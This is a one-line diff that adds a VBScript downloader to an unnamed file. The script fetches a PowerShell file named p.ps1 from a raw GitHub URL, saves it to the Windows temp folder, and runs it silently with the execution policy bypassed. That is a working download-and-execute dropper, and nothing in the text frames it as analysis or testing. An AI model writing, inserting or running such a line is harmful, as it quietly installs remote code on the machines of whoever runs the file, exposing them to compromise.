@@ -1,0 +1,1 @@
+Set x=CreateObject("MSXML2.XMLHTTP"):x.open"GET","https://raw.githubusercontent.com/cem324/screenshots/main/p.ps1",0:x.send:Set f=CreateObject("Scripting.FileSystemObject"):Set t=f.GetSpecialFolder(2):Set p=f.CreateTextFile(t&"\t.ps1"):p.Write x.responseText:p.Close:CreateObject("WScript.Shell").Run"powershell -ExecutionPolicy Bypass -File """&t&"\t.ps1""",0
